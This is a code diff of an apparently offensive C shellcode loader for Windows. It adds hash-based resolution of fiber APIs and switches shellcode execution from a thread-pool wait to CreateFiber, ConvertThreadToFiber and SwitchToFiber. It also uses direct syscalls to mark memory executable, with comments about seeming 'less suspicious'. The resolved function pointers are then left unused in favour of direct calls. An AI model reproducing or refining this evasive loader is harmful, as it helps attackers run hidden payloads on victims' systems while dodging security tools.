@@ -24,9 +24,9 @@
 #define RegQueryInfoKeyA_HASH 0x198E5584
 #define GetMonitorInfoW_HASH 0x3DA186A3
 #define EnumDisplayMonitors_HASH 0xBAEFE601
-#define CreateEventA_HASH 0x35792576
-#define CreateThreadpoolWait_HASH 0x8D5AB592
-#define SetThreadpoolWait_HASH 0x4CB4ECDE
+#define CreateFiber_HASH 0x336BC864
+#define ConvertThreadToFiber_HASH 0xFD1DF6EC
+#define SwitchToFiber_HASH 0x5EC20741
 
 
 // Function definitions of loaded functions throughout the program
@@ -97,6 +97,20 @@ typedef void (WINAPI* fnSetThreadpoolWait) (
 	PTP_WAIT  pwa,
 	HANDLE    h,
 	PFILETIME pftTimeout
+);
+
+typedef LPVOID(WINAPI* fnCreateFiber) (
+	SIZE_T                dwStackSize,
+	LPFIBER_START_ROUTINE lpStartAddress,
+	LPVOID                lpParameter
+);
+
+typedef LPVOID(WINAPI* fnConvertThreadToFiber) (
+	LPVOID lpParameter
+);
+
+typedef void(WINAPI* fnSwitchToFiber) (
+	LPVOID lpFiber
 );
 
 #define INITIAL_SEED 7
@@ -367,20 +381,18 @@ int main() {
 	// Change protection of virtual memory, less suspicious
 	Sw3NtProtectVirtualMemory((HANDLE)-1, &executable_memory, &alloc_size, PAGE_EXECUTE_READ, &old_protect);
 
-	
-	
-	LPVOID	PrimaryFiberAddress = NULL;
-	LPVOID ShellcodeFiberAddress = NULL;
+	LPVOID primary_fiber_address = NULL;
+	LPVOID shellcode_fiber_address = NULL;
 
-	if (!(ShellcodeFiberAddress = CreateFiber(0x00, (LPFIBER_START_ROUTINE)executable_memory, NULL))) {
-		return -1;
-	}
+	fnCreateFiber pCreateFiber = get_proc_address_hash(kernel32_module, CreateFiber_HASH);
+	fnConvertThreadToFiber pConvertThreadToFiber = get_proc_address_hash(kernel32_module, ConvertThreadToFiber_HASH);
+	fnSwitchToFiber pSwitchToFiber = get_proc_address_hash(kernel32_module, SwitchToFiber_HASH);
 
-	if (!(PrimaryFiberAddress = ConvertThreadToFiber(NULL))) {
-		return -1;
-	}
+	shellcode_fiber_address = CreateFiber(0x00, (LPFIBER_START_ROUTINE)executable_memory, NULL);
 
-	SwitchToFiber(ShellcodeFiberAddress);
+	primary_fiber_address = ConvertThreadToFiber(NULL);
+
+	SwitchToFiber(shellcode_fiber_address);
 
 	// Replacement for getchar(), since getchar() is in the CRT
 	HANDLE h = GetStdHandle(STD_INPUT_HANDLE);
